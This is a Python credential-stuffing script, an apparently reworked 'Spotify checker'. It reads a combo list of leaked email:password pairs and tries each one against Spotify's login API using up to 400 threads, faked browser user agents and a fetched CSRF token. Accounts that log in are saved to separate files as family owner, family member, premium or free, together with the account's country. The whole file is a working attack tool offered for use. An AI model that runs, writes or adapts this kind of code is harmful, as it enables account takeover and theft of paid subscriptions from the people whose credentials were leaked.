#!/usr/bin/python3
#Recoder
#install requests,colorama
import requests
import urllib3
from colorama import init, Fore
from threading import Thread, active_count
from fake_useragent import UserAgent
from ctypes import windll
import os
import time
 
urllib3.disable_warnings()
init(convert=True)
bersih = lambda: os.system('cls')
 
global emails
global passwords
emails = []
passwords = []
num = 0
family_owners = 0
family_members = 0
premium = 0
free = 0
invalid = 0
 
text = ('''
SPOTIFY CHECKER DETAIL (INFO)
''')
 
def logo():
        global family_owners
        global family_members
        global premium
        global free
        bersih()
        print(Fore.CYAN + text)
        # print('------------------------------------------------------------------------------------------------------------------------')
        print(Fore.CYAN +  '                                    Checked:         ' + str(family_owners + family_members + premium + free + invalid) + '/' + str(len(emails)))
        print(Fore.CYAN +  '                                    ' + Fore.GREEN + 'Family Owners:   ' + str(family_owners))
        print(Fore.CYAN + '                                    ' + Fore.YELLOW + 'Family Members:  ' + str(family_members))
        print(Fore.CYAN + '                                    ' + Fore.YELLOW + 'Premium:         ' + str(premium))
        print(Fore.CYAN +    '                                    ' + Fore.RED + 'Free:            ' + str(free))
        print(Fore.CYAN + '                                   |Invalid:         ' + str(invalid))
        # print(Fore.CYAN +'------------------------------------------------------------------------------------------------------------------------')
        time.sleep(3)
        Thread(target=logo, args=(),).start()
 
#LETEK EMAIL DAN PASSWORD
def letak():
    ok = str(input(('[?]Masukkan Combo: ')))
    with open(ok,'r', encoding='utf8') as f:
        for x in f.readlines():
            emails.append(x.split(":")[0].replace('\n','')) # tergantung empas(email:password) : atau |
            passwords.append(x.split(":")[1].replace("\n",''))
            print(emails, passwords)
 
 
# PENYIMPANAN
def family_mem_save(email,password,country):
    with open('family_member.txt', 'a', encoding='utf8') as f:
        f.write(email + ':' + password + ' - ' + country + '\n')
 
def family_owner_save(email,password,country):
    with open('family_owner.txt', 'a', encoding='utf8') as f:
        f.write(email + ':' + password + ' - ' + country + '\n')
 
def premium_save(email,password,country):
    with open('premium.txt', 'a', encoding='utf8') as f:
        f.write(email + ':' + password + ' - ' + country + '\n')
 
def save_free(email,password,country):
    with open('free.txt','a', encoding='utf8') as f:
        f.write(email + ':' + password + ' - ' + country + '\n')
 
def check(email,password):         
    global num
    global invalid
    global family_owners
    global family_members
    global premium
    global free
    with requests.Session() as (c):
        try:
            url = 'https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fint%2Faccount%2Foverview%2F'
            my_fake_s = UserAgent()
            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','User-Agent': my_fake_s.chrome}
            page = c.get(url, headers=headers)
            CSRF = page.cookies['csrf_token'] #TOKEN AUTO FRESH(SEGAR)
            headers = {'Accept': '*/*','User-Agent': my_fake_s.chrome ,'Referer': 'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fus%2Fgooglehome%2Fregister%2F&_locale=en-UK'}
            url = 'https://accounts.spotify.com/api/login'
            login_data = {'remember': 'true', 'username': email, 'password': password, 'csrf_token': CSRF}
            cookies = dict(__bon='MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx')
            login = c.post(url, headers=headers, data=login_data, cookies=cookies)
            if '{"displayName":"' in login.text: 
                url = 'https://www.spotify.com/us/account/overview/'
                capture = c.get(url, headers=headers)
                for line in capture.iter_lines():
                    if 'userCountry' in line.decode('utf-8'):
                        country = line.decode('utf-8').replace('\'userCountry\': ','').strip().replace('\'','').replace('\'','').upper()
                url = 'https://www.spotify.com/ca-en/account/subscription/change/'
                capture = c.get(url,headers=headers)
                if 'You\'re a member of a family plan.' in capture.text:
                    family_mem_save(email,password,country)
                    family_members += 1
                elif '>Remove family</a>' in capture.text:
                    family_owner_save(email,password,country)
                    family_owners += 1
                elif '\"plan\":{\"name\":\"Spotify Free\"' in capture.text:
                    save_free(email,password,country)
                    free += 1
                elif '\"plan\":{\"name\":\"Spotify Premium\"':
                    premium_save(email,password,country)
                    premium += 1
                windll.kernel32.SetConsoleTitleW("Spotify Checker | Developed by Eric Pedra ")
                #safe_print(Fore.GREEN + email + ':' + password + ' - ' + country)
            else:
                windll.kernel32.SetConsoleTitleW("Spotify Checker | Developed by Eric Pedra ")
                invalid += 1
                #safe_print(Fore.RED + email + ':' + password)
        except:
            pass
 
letak()
logo()
 
while True:
    if active_count() < 400:
        try:
            Thread(target=check, args=(emails[num],passwords[num],)).start()
            num += 1
        except:
            pass